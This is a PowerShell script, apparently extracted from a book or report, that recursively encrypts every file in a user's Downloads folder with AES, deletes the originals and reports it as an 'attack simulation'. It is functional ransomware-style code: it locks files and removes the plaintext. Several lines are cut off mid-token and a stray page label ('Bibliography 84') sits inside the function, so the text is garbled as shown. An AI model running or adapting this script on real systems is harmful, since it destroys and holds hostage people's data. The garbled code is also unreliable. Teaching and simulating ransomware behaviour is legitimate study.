# --- CONFIGURATION ---
$TargetFolder = "C:\Users\Employee1\Downloads\SecretFiles"
$Password = "P@ssw0rd123!"
$Extension = ".encrypted"
# Verify the folder exists before starting
if (!(Test-Path $TargetFolder)) {
Write-Host "Error: The folder ’$TargetFolder’ does not exist." -ForegroundColor Re
exit
}
function Invoke-AESEncryption($File, $Password) {
$Bytes = [System.IO.File]::ReadAllBytes($File)
$Salt = [System.Text.Encoding]::UTF8.GetBytes("ProjectSalt")
$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes($Password, $Sal
$AES = [System.Security.Cryptography.Aes]::Create()
$AES.Key = $Key.GetBytes(32)
$AES.IV = $Key.GetBytes(16)
$Encryptor = $AES.CreateEncryptor()
$EncryptedBytes = $Encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)
[System.IO.File]::WriteAllBytes("$File$Extension", $EncryptedBytes)
Remove-Item $File
Bibliography 84
}
Write-Host "Targeting: $TargetFolder" -ForegroundColor Cyan
Write-Host "Encrypting files..." -ForegroundColor Yellow
$Files = Get-ChildItem -Path $TargetFolder -File -Recurse | Where-Object { $_.Extensio
foreach ($File in $Files) {
Write-Host "Locked: $($File.Name)"
Invoke-AESEncryption $File.FullName $Password
}
Write-Host "Attack Simulation Complete." -ForegroundColor Red
